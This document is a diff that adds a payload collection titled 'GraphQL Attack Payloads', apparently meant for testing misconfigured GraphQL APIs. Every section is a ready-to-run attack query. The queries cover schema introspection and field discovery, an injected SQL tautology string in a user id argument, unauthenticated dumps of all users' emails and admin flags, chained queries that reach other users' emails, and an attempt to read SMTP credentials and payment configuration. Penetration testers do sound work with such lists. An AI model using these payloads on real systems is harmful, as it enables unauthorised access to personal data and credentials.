@@ -1,0 +1,101 @@
+# 🎯 GraphQL Attack Payloads
+# These are sample queries for testing insecure or misconfigured GraphQL endpoints.
+
+##############################
+# 🔍 1. Basic Enumeration
+##############################
+
+query {
+  __schema {
+    types {
+      name
+    }
+  }
+}
+
+##############################
+# 🧪 2. SQLi-like Injection (if GraphQL server isn't sanitizing input behind the scenes)
+##############################
+
+query {
+  user(id: "1' OR '1'='1") {
+    name
+    email
+  }
+}
+
+##############################
+# 🔓 3. Unauthenticated Access
+##############################
+
+query {
+  allUsers {
+    id
+    email
+    isAdmin
+  }
+}
+
+##############################
+# 🐍 4. Field Discovery
+##############################
+
+query {
+  __type(name: "User") {
+    fields {
+      name
+      type {
+        name
+        kind
+      }
+    }
+  }
+}
+
+##############################
+# 🔗 5. Deep Object Access (chained relationships)
+##############################
+
+query {
+  user(id: "123") {
+    name
+    posts {
+      title
+      comments {
+        content
+        author {
+          email
+        }
+      }
+    }
+  }
+}
+
+##############################
+# 🧬 6. Introspection Abuse (deep dive into schema)
+##############################
+
+query {
+  __schema {
+    types {
+      name
+      fields {
+        name
+      }
+    }
+  }
+}
+
+##############################
+# 📦 7. Attempt to dump internal structure
+##############################
+
+query {
+  internalSettings {
+    debugMode
+    smtpCredentials
+    paymentConfig
+  }
+}
+
+# Note: Only works if API exposes these fields and no auth checks are in place.
